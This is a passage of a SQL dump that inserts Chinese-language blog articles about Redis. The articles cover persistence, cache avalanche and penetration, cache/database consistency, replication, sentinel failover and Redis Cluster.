AOF日志文件以append-only模式写入，所以没有任何磁盘寻址的开销，写入性能非常高，而且文件不容易破损，即使文件尾部破损，也很容易修复\n3. AOF日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。因为在rewrite log的时候，会对其中进行压缩，创建出一份需要恢复数据的最小日志出来。再创建新日志文件的时候，老的日志文件还是照常写入。当新的merge后的日志文件ready的时候，再交换新老日志文件即可。\n4. AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用flushall命令清空了所有数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令给删了，然后再将该AOF文件放回去，就可以通过恢复机制，自动恢复所有数据\n\n// AOF持久化机制的缺点\n1. 对于同一份数据来说，AOF日志文件通常比RDB数据快照文件更大\n2. AOF开启后，支持的写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，当然，每秒一次fsync，性能也还是很高的\n如果你要保证一条数据都不丢，也是可以的，AOF的fsync设置成没写入一条数据，fsync一次，那就完蛋了，redis的QPS大降\n3. 数据恢复的时候，会比较慢，做冷备，定期的备份，不太方便，可能要自己手写复杂的脚本去做，做冷备不太合适\n\n// RDB和AOF到底该如何选择\n1. 不要仅仅使用RDB，因为那样会导致你丢失很多数据\n2. 也不要仅仅使用AOF，因为那样有两个问题\n	(1) 通过AOF做冷备，没有RDB做冷备，来的恢复速度更快; \n	(2) RDB每次简单粗暴生成数据快照，更加健壮，可以避免AOF这种复杂的备份和恢复机制的bug\n3. 综合使用AOF和RDB两种持久化机制，用AOF来保证数据不丢失，作为数据恢复的第一选择; 用RDB来做不同程度的冷备，在AOF文件都丢失或损坏不可用的时候，还可以使用RDB来进行快速的数据恢复\n\n```', 0, 0, 79, 0, 0, '2019-07-17 14:50:06', '2020-10-15 14:50:06', 0, 0);
INSERT INTO `article` VALUES (28, 1, 'Redis缓存雪崩与双写数据一致性', '2019/1/1546592993_F5746A11DAF6D63F5DEA0E5FA892342B.jpg', '### 缓存雪崩以及缓存穿透\n#### 缓存雪崩\n![Redis缓存雪崩.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623323416_Redis-缓存雪崩.png)\n![Redis缓存雪崩避免.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623324424_Redis-缓存雪崩避免.png)\n```java\n// 缓存雪崩\n1. 缓存中间件因为不可抗力原因宕机了,比如机房被挖断电缆\n2. 此时恰好遇到业务的高峰期,大量的用户请求蓄势待发\n3. 因为缓存挂了,大量的请求涌入数据库,数据库根本没法承受这么多请求,结果数据库被请求打死了\n4. 此时缓存死了,数据库死了,系统基本上是完蛋了\n5. 即使重启数据库也没有作用,刚刚重启的数据库一启动完就被新的大量请求继续打死,不断反复\n\n// 缓存雪崩避免\n1. redis需要高可用集群,比如单主多从+哨兵或多主多从的rediscluster,尽量避免master集群的全盘崩溃\n2. 系统中采用hystrix等限流组件,避免大量请求进入系统把mysql打死\n3. ehcache本地缓存一些数据,避免redis集群宕机后无缓存可用,但是这会产生ehcahce与redis和mysql的数据一致性问题\n4. redis集群宕机后,第一时间利用redis持久化机制,尽快恢复缓存集群一旦重启,redis自动会从磁盘上加载数据,恢复内存中的数据\n\n```\n#### 缓存穿透\n![Redis缓存穿透.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623323416_Redis-缓存穿透.png)\n```java\n// 缓存穿透\n1. 缓存穿透指的是数据未命中缓存,直接请求数据库进行查询\n2. 一般情况下,未命中缓存后请求一次就会将数据库的数据缓存至缓存中\n3. 但是面对请求数据库根本不存在的数据时,每次缓存都不会命中,每次都会查询数据库,如果该数量很大,是恶意的,那么数据库可能会因此而宕机\n\n// 缓存穿透解决\n1. 解决方式是,如果数据库查不到,那也要先缓存写入数据,比如写一个 key: -1, value: UNKNOWN,表示这是不知道的没有的数据\n2. 根据这个UNKNOWN结果进行那种404页面的处理或消息提示\n\n```\n### 保证缓存与数据库双写时的数据一致性\n```java\n// 经典缓存+数据库读写的模式，cache aside pattern\nCache Aside Pattern,老外起的名字,很高大上,其实就是两个意思\n1. 读的时候，先读缓存，缓存没有的话，那么就读数据库，然后取出数据后放入缓存，同时返回响应\n2. 更新的时候，先删除缓存，然后再更新数据库\n\n// 为什么是删除缓存，而不是更新缓存呢\n1. 很多时候，复杂点的缓存的场景，因为缓存有的时候，不简单是数据库中直接取出来的值\n2. 商品详情页的系统，修改库存，只是修改了某个表的某些字段，但是要真正把这个影响的最终的库存计算出来\n可能还需要从其他表查询一些数据，然后进行一些复杂的运算，才能最终计算出现在最新的库存是多少，然后才能将库存更新到缓存中去\n3.  比如可能更新了某个表的一个字段，然后其对应的缓存，是需要查询另外两个表的数据，并进行运算，才能计算出缓存最新的值的\n4. 所以更新缓存的代价是很高的\n5. 也许有的场景可以直接更新缓存，但是对于比较复杂的缓存数据计算的场景，就不是这样了\n比如一个频繁修改但不经常被读取的数据可以直接更新缓存\n6. 如果你频繁修改一个缓存涉及的多个表，那么这个缓存会被频繁的更新，频繁的更新缓存,这取决于这个缓存到底会不会被频繁访问到\n7. 其实删除缓存，而不是更新缓存，是一个lazy计算的思想，不要每次都重新做复杂的计算，不管它会不会用到，而是让它到需要被使用的时候再重新计算\n\n// 缓存双写不一致问题\n1. 指的是数据库与缓存写入读取时数据不一致\n2. 这是很常见的问题,刚写入的缓存数据,读取出来不一样,甚至不是最新的数据\n3. 如果系统不是严格要求缓存+数据库必须一致性的话，缓存可以稍微的跟数据库偶尔有不一致的情况\n\n```\n#### 数据库与缓存写入顺序错误\n![Redis最初级的缓存不一致问题以及解决方式.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623328485_Redis-最初级的缓存不一致问题以及解决方式.png)\n```java\n1. 先修改数据库，再删除缓存，如果删除缓存失败了，那么会导致数据库中是新数据，缓存中是旧数据，数据出现不一致\n2. 先删除缓存，再修改数据库，如果删除缓存成功了，如果修改数据库失败了，那么数据库中是旧数据，缓存中是空的，那么数据不会不一致\n因为读的时候缓存没有，则读数据库中旧数据，然后更新到缓存中\n\n```\n#### 并发导致的数据不一致\n![Redis并发导致的缓存不一致问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623329823_Redis-并发导致的缓存不一致问题.png)\n![Redis并发导致的缓存不一致问题解决.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623331155_Redis-并发导致的缓存不一致问题解决.png)\n![Redis并发导致的缓存不一致问题解决实例集群.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623335183_Redis-并发导致的缓存不一致问题解决-实例集群.png)\n![Redis并发导致的缓存不一致问题解决优化.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623335183_Redis-并发导致的缓存不一致问题解决-优化.png)\n```java\n1. 数据发生了变更，线程A先删除了缓存，然后要去修改数据库，此时还没修改\n2. 一个请求线程B过来，去读缓存，发现缓存空了，去查询数据库，查到了修改前的旧数据，放到了缓存中\n3. 线程A完成了数据库的修改\n4. 完了，数据库和缓存中的数据不一样了\n\n// 上亿流量高并发场景下，缓存会出现这个问题\n1. 只有在对一个数据在并发的进行读写的时候，才可能会出现这种问题\n2. 其实如果说你的并发量很低的话，特别是读并发很低，每天访问量就1万次，那么很少的情况下，会出现刚才描述的那种不一致的场景\n3. 但是问题是，如果每天的是上亿的流量，每秒并发读是几万，每秒只要有数据更新的请求，就可能会出现上述的数据库+缓存不一致的情况\n\n// 解决方式\n// 数据库与缓存更新与读取操作进行异步串行化\n1. 更新数据的时候，根据数据的唯一标识，将操作路由之后，发送到一个jvm内部的队列中\n2. 读取数据的时候，如果发现数据不在缓存中，那么将重新读取数据+更新缓存的操作，根据唯一标识路由之后，也发送同一个jvm内部的队列中\n3. 一个队列对应一个工作线程,每个工作线程串行拿到对应的操作，然后一条一条的执行\n4. 这样的话，一个数据变更的操作，先执行，删除缓存，然后再去更新数据库，但是还没完成更新,此时如果一个读请求过来，读到了空的缓存，那么可以先将缓存更新的请求发送到队列中，此时会在队列中积压，然后同步等待缓存更新完成\n\n// 异步串行化优化\n1. 一个队列中，其实多个读请求串在一起是没意义的\n2. 因此可以做过滤，如果发现队列中已经有一个读请求了，那么就不用再放个读请求操作进去了,直接等待前面的读请求完成即可\n3. 写请求删除缓存后,进行数据库最新数据的更新\n4. 读请求会从数据库中读取最新的值,然后写入缓存中\n5. 此时其他读请求还在等待时间范围内，不断轮询hang发现可以从缓存取到值了，那么就直接返回; 如果读请求等待的时间超过一定时长，那么这一次直接从数据库中读取当前的旧值\n\n// 高并发的场景下，该解决方案要注意的问题\n1. 读请求长时阻塞	\n	(1) 由于读请求进行了非常轻度的异步化，所以一定要注意读超时的问题，每个读请求必须在超时时间范围内返回\n	(2) 该解决方案，最大的风险点在于说，可能数据更新很频繁，导致队列中积压了大量更新操作在里面，然后读请求会发生大量的超时，最后导致大量的请求直接走数据库\n	(3) 必须通过一些模拟真实的测试，看看更新数据的频繁是怎样的\n	一定要做根据实际业务系统的运行情况，去进行一些压力测试，和模拟线上环境，去看看最繁忙的时候，内存队列可能会挤压多少更新操作，可能会导致最后一个更新操作对应的读请求，会hang多少时间，如果读请求在200ms返回，如果你计算过后，哪怕是最繁忙的时候，积压10个更新操作，最多等待200ms，那还可以的\n	(4) 因为一个队列中，可能会积压针对多个数据项的更新操作，因此需要根据自己的业务情况进行测试，可能需要部署多个服务，每个服务分摊一些数据的更新操作\n	(5) 如果一个内存队列里居然会挤压100个商品的库存修改操作，每隔库存修改操作要耗费10ms区完成，那么最后一个商品的读请求，可能等待10 * 100 = 1000ms = 1s后，才能得到数据,这个时候就导致读请求的长时阻塞\n	(6) 如果一个内存队列可能积压的更新操作特别多，那么就要加机器，让每个机器上部署的服务实例处理更少的数据，那么每个内存队列中积压的更新操作就会越少\n	一般来说数据的写频率是很低的，因此实际上正常来说，在队列中积压的更新操作应该是很少的,一般写请求相对读来说，是非常非常少的，每秒的QPS能到几百就不错了\n	(7) 单机器，20个内存队列，每个内存队列，可能就积压5个写操作，每个写操作性能测试后，一般在20ms左右就完成,针对每个内存队列中的数据的读请求，也就最多hang一会儿，200ms以内肯定能返回了\n	(8) 单机支撑写QPS几百没问题，写QPS扩大10倍,那么就扩容机器，扩容10倍的机器，10台机器，每个机器20个队列，200个队列\n	大部分的情况下，应该是这样的，大量的读请求过来，都是直接走缓存取到数据的\n	(9) 少量情况下，可能遇到读跟数据更新冲突的情况，如上所述，那么此时更新操作如果先入队列，之后可能会瞬间来了对这个数据大量的读请求，但是因为做了去重的优化，所以也就一个更新缓存的操作跟在它后面,等数据更新完了，读请求触发的缓存更新操作也完成，然后临时等待的读请求全部可以读到缓存中的数据\n\n2. 读请求并发量过高\n	(1) 必须做好压力测试，有一个风险，就是突然间大量读请求会在几十毫秒的延时hang在服务上，看服务能不能抗的住，需要多少机器才能抗住最大的极限情况的峰值\n	(2) 但是因为并不是所有的数据都在同一时间更新，缓存也不会同一时间失效，所以每次可能也就是少数数据的缓存失效了，然后那些数据对应的读请求过来，并发量应该也不会特别大\n	\n3. 多服务实例部署的请求路由\n	(1) 可能库存服务部署了多个实例，那么必须保证说，执行数据更新操作，以及执行缓存更新操作的请求，都路由到相同的服务实例上\n\n4. 热点商品的路由问题，导致请求的倾斜\n	（1） 万一某个商品的读写请求特别高，全部打到相同的机器的相同的队列里面去了，可能造成某台机器的压力过大\n	 (2) 就是说，因为只有在商品数据更新的时候才会清空缓存，然后才会导致读写并发，所以更新频率不是太高的话，这个问题的影响并不是特别大,但是的确可能某些机器的负载会高一些\n\n读请求和写请求串行化，串到一个内存队列里去，可以保证一定不会出现不一致的情况\n一般来说，如果系统不是严格要求缓存+数据库必须一致性的话，缓存可以稍微的跟数据库偶尔有不一致的情况最好不要做这个方案\n串行化之后，就会导致系统的吞吐量会大幅度的降低，用比正常情况下多几倍的机器去支撑线上的一个请求。\n\n```\n\n### redis的并发竞争\n![Redis并发竞争.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623337711_Redis-并发竞争.png)\n![Redis并发竞争解决方式.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623338617_Redis-并发竞争-解决方式.png)\n```java\n// redis的并发竞争\n1. 多客户端同时并发写一个key，可能本来应该先到的数据后到了，导致数据版本错了。\n2. 多客户端同时获取一个key，修改值之后再写回去，只要顺序错了，数据就错了。\n3. 首先确保同一时间，只能有一个系统实例在操作某个key\nredis自己的客户端用CAS类的乐观锁方案解决这个问题的\n我们因为多台机器原因,能难使用CAS来解决这个问题,常用的解决方案是使用分布式锁\n4. 然后确保最后数据一定是最新的数据,旧数据不能覆盖新数据\n我们可以使用时间戳来解决这个问题,缓存数据的value中必须带有写入时的时间戳,缓存数据更新时比较时间戳决定是否更新缓存数据\n\n// 解决方式\n分布式锁: 确认同一个时间,只能有一个系统实例在操作key,别的系统不允许操作读和写\n比对时间戳: 每次要写之前,先判断一下,当前这个value的时间戳是否比缓存里的value的时间戳要新.是的话,写入,不是的话,放弃写入\n\n\n```', 0, 0, 194, 0, 0, '2019-07-17 18:16:23', '2020-09-10 18:16:23', 0, 0);
INSERT INTO `article` VALUES (29, 1, 'Redis主从架构与哨兵机制', '2021/6/1623232127_mmexport1623043909287.jpg', '### 主从架构\n![Redis主从架构.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623224448_Redis主从架构.png)\n```java\n如果用redis缓存技术的话，肯定要考虑如何用redis来加多台机器，保证redis是高并发的\n还有就是如何让Redis保证自己不是挂掉以后就直接死掉了，redis高可用\n// 高并发\nredis高并发：主从架构，一主多从，一般来说，很多项目其实就足够了\n单主用来写入数据，单机几万QPS，多从用来查询数据，多个从实例可以提供每秒10万的QPS。\nredis高并发的同时，还需要容纳大量的数据：一主多从，每个实例都容纳了完整的数据，比如redis主就10G的内存量，其实你就最对只能容纳10g的数据量。\n如果你的缓存要容纳的数据量很大，达到了几十g，甚至几百g，或者是几t，那你就需要redis集群，而且用redis集群之后，可以提供可能每秒几十万的读写并发。\n\n// 高可用\nredis高可用：如果你做主从架构部署，其实就是加上哨兵就可以了，就可以实现，任何一个实例宕机，自动会进行主备切换。\n\n// redis replication以及master持久化对主从架构的安全意义\n// redis replication的核心机制\n（1）redis采用异步方式复制数据到slave节点，不过redis 2.8开始，slave node会周期性地确认自己每次复制的数据量\n（2）一个master node是可以配置多个slave node的\n（3）slave node也可以连接其他的slave node\n（4）slave node做复制的时候，是不会block master node的正常工作的\n（5）slave node在做复制的时候，也不会block对自己的查询操作，它会用旧的数据集来提供服务; 但是复制完成的时候，需要删除旧数据集，加载新数据集，这个时候就会暂停对外服务了\n（6）slave node主要用来进行横向扩容，做读写分离，扩容的slave node可以提高读的吞吐量\n\n// master持久化对于主从架构的安全保障的意义\n如果采用了主从架构，那么建议必须开启master node的持久化！\n不建议用slave node作为master node的数据热备，因为那样的话，如果你关掉master的持久化，可能在master宕机重启的时候数据是空的，然后可能一经过复制，salve node数据也丢了\nmaster -> RDB和AOF都关闭了 -> 全部在内存中\nmaster宕机，重启，是没有本地数据可以恢复的，然后就会直接认为自己IDE数据是空的\nmaster就会将空的数据集同步到slave上去，所有slave的数据全部清空,100%的数据丢失\nmaster节点，必须要使用持久化机制\n万一本地的所有文件丢失了; 从备份中挑选一份rdb去恢复master; 这样才能确保master启动的时候，是有数据的\n即使采用了高可用机制，slave node可以自动接管master node，但是也可能sentinal还没有检测到master failure，master node就自动重启了，还是可能导致上面的所有slave node数据清空故障\n\n```\n### 主从复制流程\n![Redis主从复制流程.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623230115_Redis-主从复制流程.png)\n```java\n// 数据同步相关核心细节机制\n指的就是第一次slave连接msater的时候，执行的全量复制，那个过程里面的一些细节的机制\n1. master和slave都会维护一个offset\n	（1）master和slave都会维护一个offset\n	（2）master会在自身不断累加offset，slave也会在自身不断累加offset\n	（3）slave每秒都会上报自己的offset给master，同时master也会保存每个slave的offset\n	（4）这个倒不是说特定就用在全量复制的，主要是master和slave都要知道各自的数据的offset，才能知道互相之间的数据不一致的情况,实现断点续传\n\n2. backlog\n	（1）master node有一个backlog，默认是1MB大小\n	（2）master node给slave node复制数据时，也会将数据在backlog中同步写一份\n	（3）backlog主要是用来做全量复制中断后增量复制的\n\n3. master run id\n	（1）redis控制台中info server，可以看到master run id\n	（2）如果根据host+ip定位master node，是不靠谱的\n	比如恢复数据,将rdb的冷备覆盖到master当中,此时master的数据变了,run id也变化了,进而同步其他slave节点数据\n	比如master node重启或者数据出现了变化，那么slave node应该根据不同的run id区分，run id不同就做全量复制\n	（3）如果需要不更改run id重启redis，可以使用redis-cli debug reload命令\n	比如恢复数据,将rdb的冷备覆盖到master当中,此时master的数据变了,run id也变化了,进而同步其他slave节点数据\n\n4. psync\n	（1）slave节点使用psync从master node进行复制，psync run id offset\n	（2）master node会根据自身的情况返回响应信息，根据run id是否不同,可能是FULLRESYNC run id offset触发全量复制，可能是CONTINUE触发增量复制\n\n// 全量复制\n1. master执行bgsave，在本地生成一份rdb快照文件\n2. master node将rdb快照文件发送给salve node，如果rdb复制时间超过60秒（repl-timeout），那么slave node就会认为复制失败，可以适当调节大这个参数\n3. 对于千兆网卡的机器，一般每秒传输100MB，6G文件，很可能超过60s\n4. master node在生成rdb时，会将所有新的写命令缓存在内存中，在salve node保存并加载了rdb至本地之后，再将新的写命令复制给salve node\n5. client-output-buffer-limit slave 256MB 64MB 60，如果在复制期间，内存缓冲区持续消耗超过64MB，或者一次性超过256MB，那么停止复制，复制失败\n6. slave node接收到rdb之后，清空自己的旧数据，然后重新加载rdb到自己的内存中，同时基于旧的数据版本对外提供服务\n7. 如果slave node开启了AOF，那么会立即执行BGREWRITEAOF，重写AOF\nrdb生成、rdb通过网络拷贝、slave旧数据的清理、slave aof rewrite，很耗费时间\n如果复制的数据量在4G~6G之间，那么很可能全量复制时间消耗到1分半到2分钟\n\n// 增量复制\n1. 如果全量复制过程中，master-slave网络连接断掉，那么salve重新连接master时，会触发增量复制\n2. master直接从自己的backlog中获取部分丢失的数据，发送给slave node，默认backlog就是1MB,剩余部分数据根据offset继续同步复制\n3. msater就是根据slave发送的psync中的offset来从backlog中获取数据的\n\n// 主从架构的核心流程原理\n1. 当启动一个slave node的时候，它会发送一个PSYNC命令给master node\n2. 如果这时slave node重新连接master node，那么master node仅仅会复制给slave部分缺少的数据; \n3. 否则如果是slave node第一次连接master node，那么会触发一次full resynchronization\n4. 开始full resynchronization的时候，master会启动一个后台线程，开始生成一份RDB快照文件，同时还会将从客户端收到的所有写命令缓存在内存中。\n5. RDB文件生成完毕之后，master会将这个RDB发送给slave，slave会先写入本地磁盘，然后再从本地磁盘加载到内存中。\n6. 然后master会将内存中缓存的写命令发送给slave，slave也会同步这些新数据。\n7. slave node如果跟master node有网络故障，断开了连接，会自动重连。\n8. master如果发现有多个slave node都来重新连接，仅仅会启动一个rdb save操作，用一份数据服务所有slave node。\n\n// slave node的复制完整运行流程\n1. slave node启动，仅仅保存master node的信息，包括master node的host和ip，但是复制流程没开始,master host和ip是从redis.conf里面的slaveof配置的\n2. slave node内部有个定时任务，每秒检查是否有新的master node要连接和复制，如果发现，就跟master node建立socket网络连接\n3. slave node发送ping命令给master node\n4. 口令认证，如果master设置了requirepass，那么salve node必须发送masterauth的口令过去进行认证\n5. master node第一次执行全量复制，将所有数据发给slave node\n6. master node后续持续将写命令，异步复制给slave node\n\n// 主从复制的断点续传\n1. 从redis 2.8开始，就支持主从复制的断点续传，如果主从复制过程中，网络连接断掉了，那么可以接着上次复制的地方，继续复制下去，而不是从头开始复制一份\n2. master node会在内存中创建一个backlog，master和slave都会保存一个replica offset还有一个master id，offset就是保存在backlog中的。\n3. 但是如果没有找到对应的offset，那么就会执行一次resynchronization\n\n// 异步复制\nmaster每次接收到写命令之后，先在内部写入数据，然后异步发送给slave node\n\n// 无磁盘化复制\nmaster在内存中直接创建rdb，然后发送给slave，不会在自己本地落地磁盘了\nrepl-diskless-sync no,是否开启无磁盘化复制\nrepl-diskless-sync-delay 5,等待一定时长再开始复制，因为要等更多slave重新连接过来\n\n// heartbeat\n主从节点互相都会发送heartbeat信息\nmaster默认每隔10秒发送一次heartbeat，salve node每隔1秒发送一个heartbeat\n\n// 过期key处理\nslave不会过期key，只会等待master过期key。如果master过期了一个key，或者通过LRU淘汰了一个key，那么会模拟一条del命令发送给slave。\n\n```\n### 哨兵机制\n![Redis哨兵机制.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623238614_Redis-哨兵机制.png)\n```java\n// 哨兵的介绍\nsentinal，中文名是哨兵\n哨兵是redis集群架构中非常重要的一个组件，主要功能如下\n1. 集群监控，负责监控redis master和slave进程是否正常工作\n2. 消息通知，如果某个redis实例有故障，那么哨兵负责发送消息作为报警通知给管理员\n3. 故障转移，如果master node挂掉了，会自动转移到slave node上\n4. 配置中心，如果故障转移发生了，通知client客户端新的master地址\n\n哨兵本身也是分布式的，作为一个哨兵集群去运行，互相协同工作\n（1）故障转移时，判断一个master node是宕机了，需要大部分的哨兵都同意才行，涉及到了分布式选举的问题\n（2）即使部分哨兵节点挂掉了，哨兵集群还是能正常工作的，因为如果一个作为高可用机制重要组成部分的故障转移系统本身是单点的，那就很坑爹了\n\n// 哨兵的核心知识\n1. 哨兵至少需要3个实例，来保证自己的健壮性\n2. 哨兵 + redis主从的部署架构，是不会保证数据零丢失的，只能保证redis集群的高可用性\n3. 对于哨兵 + redis主从这种复杂的部署架构，尽量在测试环境和生产环境，都进行充足的测试和演练\n\n// 为什么redis哨兵集群只有2个节点无法正常工作？\n哨兵集群必须部署2个以上节点\n如果哨兵集群仅仅部署了个2个哨兵实例，quorum=1\n1. master宕机，s1和s2中只要有1个哨兵认为master宕机就可以还行切换，同时s1和s2中会选举出一个哨兵来执行故障转移\n2. 同时这个时候，需要majority，也就是要求majority哨兵数量都是运行的（2的majority=2，3的majority=2，5的majority=3，4的majority=2）\n3. 2的majority=2，2个哨兵都运行时，就可以允许执行故障转移\n4. 但是如果一个哨兵宕机了，那么哨兵只有1个了，此时因为majority数量不足无法执行故障转移\n5. 3个哨兵的majority是2，所以还剩下的2个哨兵运行着，就可以允许执行故障转移,哨兵最少部署3个节点\n\n// redis哨兵的多个核心底层原理的深入解析\n// sdown和odown转换机制\nsdown和odown两种失败状态\nsdown是主观宕机，就一个哨兵如果自己觉得一个master宕机了，那么就是主观宕机\nodown是客观宕机，如果quorum数量的哨兵都觉得一个master宕机了，那么就是客观宕机\nsdown达成的条件很简单，如果一个哨兵ping一个master，超过了is-master-down-after-milliseconds指定的毫秒数之后，就主观认为master宕机\nsdown到odown转换的条件很简单，如果一个哨兵在指定时间内，收到了quorum指定数量的其他哨兵也认为那个master是sdown了，那么就认为是odown了，客观认为master宕机\n\n// 哨兵集群的自动发现机制\n哨兵互相之间的发现，是通过redis的pub/sub系统实现的，每个哨兵都会往__sentinel__:hello这个channel里发送一个消息，这时候所有其他哨兵都可以消费到这个消息，并感知到其他的哨兵的存在\n每隔两秒钟，每个哨兵都会往自己监控的某个master+slaves对应的__sentinel__:hello channel里发送一个消息，内容是自己的host、ip和runid还有对这个master的监控配置\n每个哨兵也会去监听自己监控的每个master+slaves对应的__sentinel__:hello channel，然后去感知到同样在监听这个master+slaves的其他哨兵的存在\n每个哨兵还会跟其他哨兵交换对master的监控配置，互相进行监控配置的同步\n\n// slave配置的自动纠正\n哨兵会负责自动纠正slave的一些配置，比如slave如果要成为潜在的master候选人，哨兵会确保slave在复制现有master的数据; \n如果其他slave连接到了一个错误的master上，比如故障转移之后，那么哨兵会确保它们连接到正确的新master上\n\n// slave->master选举算法\n如果一个master被认为odown了，而且majority哨兵都允许了主备切换，那么某个哨兵就会执行主备切换操作，此时首先要选举一个slave来会考虑slave的一些信息\n	（1）跟master断开连接的时长\n	（2）slave优先级\n	（3）复制offset\n	（4）run id\n如果一个slave跟master断开连接已经超过了down-after-milliseconds的10倍，外加master宕机的时长，那么slave就被认为不适合选举为master\n(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state\n接下来会对slave进行排序\n	（1）按照slave优先级进行排序，slave priority越低，优先级就越高\n	（2）如果slave priority相同，那么看replica offset，哪个slave复制了越多的数据，offset越靠后数据越完整，优先级就越高\n	（3）如果上面两个条件都相同，那么选择一个run id比较小的那个slave\n\n// quorum和majority\n每次一个哨兵要做主备切换，首先需要quorum数量的哨兵认为odown，然后选举出一个哨兵来做切换，这个哨兵还得得到majority哨兵的授权，才能正式执行切换\n如果quorum < majority，比如5个哨兵，majority就是3，quorum设置为2，那么就3个哨兵授权就可以执行切换\n但是如果quorum >= majority，那么必须quorum数量的哨兵都授权，比如5个哨兵，quorum是5，那么必须5个哨兵都同意授权，才能执行切换\n\n// configuration epoch\n哨兵会对一套redis master+slave进行监控，有相应的监控的配置\n执行切换的那个哨兵，会从要切换到的新master（salve->master）那里得到一个configuration epoch，这就是一个version号，每次切换的version号都必须是唯一的\n如果第一个选举出的哨兵切换失败了，那么其他哨兵，会等待failover-timeout时间，然后接替继续执行切换，此时会重新获取一个新的configuration epoch，作为新的version号\n\n// configuraiton传播\n哨兵完成切换之后，会在自己本地更新生成最新的master配置，然后同步给其他的哨兵，就是通过之前的pub/sub消息机制\n这里之前的version号就很重要了，因为各种消息都是通过一个channel去发布和监听的，所以一个哨兵完成一次新的切换之后，新的master配置是跟着新的version号的其他的哨兵都是根据版本号的大小来更新自己的master配置的\n\n```\n### 哨兵主备切换的数据丢失问题\n![Redis脑裂.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623238614_Redis-脑裂.png)\n```java\n主备切换的过程，可能会导致数据丢失\n// 异步复制导致的数据丢失\n因为master -> slave的复制是异步的，所以可能有部分数据还没复制到slave，master就宕机了，此时这些部分数据就丢失了\n\n// 脑裂导致的数据丢失\n脑裂，也就是说，某个master所在机器突然脱离了正常的网络，跟其他slave机器不能连接，但是实际上master还运行着\n此时哨兵可能就会认为master宕机了，然后开启选举，将其他slave切换成了master\n这个时候，集群里就会有两个master，也就是所谓的脑裂\n此时虽然某个slave被切换成了master，但是可能client还没来得及切换到新的master，还继续写向旧master的数据可能也丢失了\n因此旧master再次恢复的时候，会被作为一个slave挂到新的master上去，自己的数据会清空，重新从新的master复制数据\n\n// 解决异步复制和脑裂导致的数据丢失\nmin-slaves-to-write 1\nmin-slaves-max-lag 10\n上面两个配置可以减少异步复制和脑裂导致的数据丢失\n要求至少有1个slave，数据复制和同步的延迟不能超过10秒\n如果说一旦所有的slave，数据复制和同步的延迟都超过了10秒钟，那么这个时候，master就不会再接收来自客户端任何请求了\n\n// 减少异步复制的数据丢失\n有了min-slaves-max-lag这个配置，就可以确保说，一旦slave复制数据和ack延时太长，就认为可能master宕机后损失的数据太多了，\n那么就拒绝客户端新的写请求，这样可以把master宕机时由于部分数据未同步到slave导致的数据丢失降低的可控范围内\n\n// 减少脑裂的数据丢失\n如果一个master出现了脑裂，跟其他slave丢了连接，那么上面两个配置可以确保说\n如果不能继续给指定数量的slave发送数据，而且slave超过10秒没有给master发送ack消息，那么就直接拒绝客户端的写请求\n这样脑裂后的旧master就不会接受client的新数据，也就避免了数据丢失\n直到旧master脑裂恢复正常或新的master出现替代脑裂的master,通知客户端更换新master写入\n因此在脑裂场景下，最多就丢失10秒的数据\n\n```', 0, 0, 118, 0, 0, '2019-07-18 22:01:59', '2019-12-13 22:01:59', 0, 0);
INSERT INTO `article` VALUES (30, 1, 'RedisCluster集群机制与数据分布算法', '2021/5/1621410540_mmexport1621058338170.jpg', '### RedisCluster介绍\n![RedisRedisClusterreplication加sentinal的缺陷.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623251947_Redis-RedisCluster-replication加sentinal的缺陷.png)\n![RedisRedisClusterRedisCluster模式.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623251947_Redis-RedisCluster-RedisCluster模式.png)\n```java\n// 单master在海量数据面前的瓶颈\n1. master节点的数据和slave节点的数据是一摸一样的,master最大容纳多少数据量,slave就容纳多少数据量\n2. 单master多slave架构导致少量内存无法支撑更大的数据量\n\n// redis cluster介绍\n1. 自动将数据进行分片，每个master上放一部分数据\n2. 提供内置的高可用支持，部分master不可用时，还是可以继续工作的\n在redis cluster架构下，每个redis要放开两个端口号，比如一个是6379，另外一个就是加10000的端口号，比如17279\n17279端口号是用来进行节点间通信的，也就是cluster bus的东西，集群总线。cluster bus的通信，用来进行故障检测，配置更新，故障转移授权\ncluster bus用了另外一种二进制的协议，主要用于节点间进行高效的数据交换，占用更少的网络带宽和处理时间\n\n// redis cluster好处\n1. 多master,整个redis就可以横向扩容了,如果要支撑更大数据量,那就横向扩容更多的master节点\n2. 支撑N个redis master node，每个master node都可以挂载多个slave node\n3. 高可用，因为每个master都有salve节点，那么如果mater挂掉，redis cluster这套机制，就会自动将某个slave切换成master\n4. 我们只要基于redis cluster去搭建redis集群即可，不需要手工去搭建replication复制+主从架构+读写分离+哨兵集群+高可用\n\n// redis cluster vs replication + sentinal\n1. 如果数据量很少，主要是承载高并发高性能的场景，比如你的缓存一般就几个G，单机足够了,但是无法高可用\n2. replication，一个master，多个slave，要几个slave跟你的要求的读吞吐量有关系，然后搭建一个sentinal集群，去保证redis主从架构的高可用性，就可以了\n3. redis cluster，主要是针对海量数据+高并发+高可用的场景，海量数据，如果数据量很大，那么建议就用redis cluster\n\n\n\n// 节点间的内部通信机制\n// 